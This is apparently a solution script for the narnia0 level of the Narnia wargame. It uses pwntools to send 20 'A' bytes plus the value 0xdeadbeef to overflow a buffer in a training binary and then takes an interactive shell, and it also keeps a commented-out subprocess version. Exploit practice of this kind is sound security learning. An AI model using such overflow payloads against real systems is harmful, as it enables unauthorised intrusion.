# python built-in 
#import struct
#import subprocess
#from pwn import *

#binary="/narnia/narnia0"

#payload = "A" * 20
#payload = payload.encode() + p32(0xdeadbeef)
#p = subprocess.Popen([binary], stdin=subprocess.PIPE)
#p.stdin.write(payload)
#p.stdin.close()

#pwn tools
from pwn import *

binary = "/narnia/narnia0"

payload = b"A" * 20
payload += p32(0xdeadbeef)

p = process(binary)
p.sendline(payload)
p.interactive()
